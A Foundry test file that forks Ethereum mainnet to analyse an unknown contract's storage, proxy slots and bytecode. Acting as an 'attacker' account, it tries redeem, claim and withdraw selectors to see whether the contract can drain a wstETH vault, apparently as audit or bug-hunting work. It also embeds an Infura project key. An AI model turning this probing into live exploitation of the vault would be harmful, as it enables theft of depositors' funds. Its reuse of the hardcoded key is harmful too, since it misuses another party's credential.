// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract MysteryContract is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    // The mystery address from 0x9fd0506d
    address constant MYSTERY = 0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeMysteryContract() public view {
        console.log("=== ANALYZING MYSTERY CONTRACT ===\n");

        console.log("Address:", MYSTERY);
        console.log("Code size:", MYSTERY.code.length);

        // Check storage
        console.log("\nStorage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(MYSTERY, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
                console.log("  As address:", address(uint160(uint256(slot))));
            }
        }

        // Check EIP-1967 proxy slots
        bytes32 implSlot = vm.load(MYSTERY, bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1));
        if (implSlot != bytes32(0)) {
            console.log("\nEIP-1967 implementation:");
            console.log(address(uint160(uint256(implSlot))));
        }

        bytes32 adminSlot = vm.load(MYSTERY, bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1));
        if (adminSlot != bytes32(0)) {
            console.log("EIP-1967 admin:");
            console.log(address(uint160(uint256(adminSlot))));
        }
    }

    function test_MysteryContractFunctions() public {
        console.log("=== MYSTERY CONTRACT FUNCTIONS ===\n");

        // Try common view functions
        console.log("Trying view functions:");

        (bool s1, bytes memory d1) = MYSTERY.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (s1 && d1.length >= 32) {
            console.log("owner():", abi.decode(d1, (address)));
        }

        (bool s2, bytes memory d2) = MYSTERY.staticcall(
            abi.encodeWithSignature("name()")
        );
        if (s2) {
            console.log("name():", abi.decode(d2, (string)));
        }

        (bool s3, bytes memory d3) = MYSTERY.staticcall(
            abi.encodeWithSignature("symbol()")
        );
        if (s3) {
            console.log("symbol():", abi.decode(d3, (string)));
        }

        (bool s4, bytes memory d4) = MYSTERY.staticcall(
            abi.encodeWithSignature("redemptionController()")
        );
        if (s4 && d4.length >= 32) {
            console.log("redemptionController():", abi.decode(d4, (address)));
        }

        (bool s5, bytes memory d5) = MYSTERY.staticcall(
            abi.encodeWithSignature("vault()")
        );
        if (s5 && d5.length >= 32) {
            console.log("vault():", abi.decode(d5, (address)));
        }

        (bool s6, bytes memory d6) = MYSTERY.staticcall(
            abi.encodeWithSignature("asset()")
        );
        if (s6 && d6.length >= 32) {
            console.log("asset():", abi.decode(d6, (address)));
        }

        (bool s7, bytes memory d7) = MYSTERY.staticcall(
            abi.encodeWithSignature("totalSupply()")
        );
        if (s7 && d7.length >= 32) {
            console.log("totalSupply():", abi.decode(d7, (uint256)));
        }
    }

    function test_IsMysteryRegisteredInRC() public view {
        console.log("=== IS MYSTERY REGISTERED IN RC? ===\n");

        // Check if MYSTERY is registered as a redemption in RC
        bytes32 key = keccak256(abi.encode(MYSTERY, uint256(4)));
        bytes32 val = vm.load(REDEMPTION_CONTROLLER, key);

        console.log("Registration check:");
        console.logBytes32(val);

        if (val != bytes32(0)) {
            console.log("*** MYSTERY IS REGISTERED IN RC! ***");
            console.log("Registration value:", uint256(val));
        } else {
            console.log("MYSTERY is NOT registered in RC");
        }
    }

    function test_CanMysteryDrainVault() public {
        console.log("=== CAN MYSTERY DRAIN VAULT? ===\n");

        // If MYSTERY is registered, it can call RC.redeem!

        bytes32 key = keccak256(abi.encode(MYSTERY, uint256(4)));
        bytes32 val = vm.load(REDEMPTION_CONTROLLER, key);

        if (val == bytes32(0)) {
            console.log("MYSTERY not registered - can't test drain");
            return;
        }

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // Try to call MYSTERY to make it call RC.redeem
        vm.startPrank(attacker);

        // Maybe MYSTERY has a function that calls RC.redeem?
        (bool s1,) = MYSTERY.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(1000e18))
        );
        console.log("redeem(uint96):", s1);

        (bool s2,) = MYSTERY.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("finalizeRedeem:", s2);

        (bool s3,) = MYSTERY.call(
            abi.encodeWithSignature("claim()")
        );
        console.log("claim():", s3);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH:", attackerWstETH);
    }

    function test_MysteryBytecodeAnalysis() public view {
        console.log("=== MYSTERY BYTECODE ANALYSIS ===\n");

        bytes memory code = MYSTERY.code;
        console.log("Code size:", code.length);

        // Find function selectors
        console.log("\nFunction selectors:");
        bytes4[] memory found = new bytes4[](30);
        uint count = 0;

        for (uint i = 0; i + 4 < 400 && i < code.length && count < 30; i++) {
            if (uint8(code[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                bool hasEq = false;
                for (uint j = i + 5; j < i + 15 && j < code.length; j++) {
                    if (uint8(code[j]) == 0x14) hasEq = true;
                }
                if (hasEq && sel != bytes4(0) && uint32(sel) > 0x1000) {
                    bool unique = true;
                    for (uint k = 0; k < count; k++) {
                        if (found[k] == sel) unique = false;
                    }
                    if (unique) {
                        found[count] = sel;
                        count++;
                        console.logBytes4(sel);
                    }
                }
            }
        }

        // Check for CALL to RC
        console.log("\nCALL opcodes in MYSTERY:");
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf1) {
                console.log("CALL at:", i);
            }
        }

        // Check for DELEGATECALL
        console.log("\nDELEGATECALL opcodes:");
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) {
                console.log("DELEGATECALL at:", i);
            }
        }
    }

    function test_TryMysteryWithAttacker() public {
        console.log("=== TRYING MYSTERY AS ATTACKER ===\n");

        deal(TASSET, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(MYSTERY, type(uint256).max);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Try various functions
        bytes4[] memory sels = new bytes4[](15);
        sels[0] = bytes4(keccak256("redeem(uint96)"));
        sels[1] = bytes4(keccak256("redeem(uint256)"));
        sels[2] = bytes4(keccak256("redeem(uint256,address)"));
        sels[3] = bytes4(keccak256("finalizeRedeem(uint256)"));
        sels[4] = bytes4(keccak256("claim()"));
        sels[5] = bytes4(keccak256("claim(address)"));
        sels[6] = bytes4(keccak256("withdraw(uint256)"));
        sels[7] = bytes4(keccak256("withdraw(uint256,address)"));
        sels[8] = bytes4(keccak256("execute(address,bytes)"));
        sels[9] = bytes4(keccak256("claimRewards()"));
        sels[10] = bytes4(keccak256("getRewards()"));
        sels[11] = bytes4(keccak256("harvest()"));
        sels[12] = bytes4(keccak256("compound()"));
        sels[13] = bytes4(keccak256("deposit(uint256)"));
        sels[14] = bytes4(keccak256("stake(uint256)"));

        console.log("Trying functions on MYSTERY:");
        for (uint i = 0; i < sels.length; i++) {
            (bool s,) = MYSTERY.call{gas: 500000}(
                abi.encodeWithSelector(sels[i], uint256(1000e18), attacker)
            );
            if (s) {
                console.log("SUCCESS:");
                console.logBytes4(sels[i]);
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);
        uint256 mysteryWstETH = IERC20(wstETH).balanceOf(MYSTERY);

        console.log("\nResults:");
        console.log("Vault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH:", attackerWstETH);
        console.log("Mystery wstETH:", mysteryWstETH);
    }
}
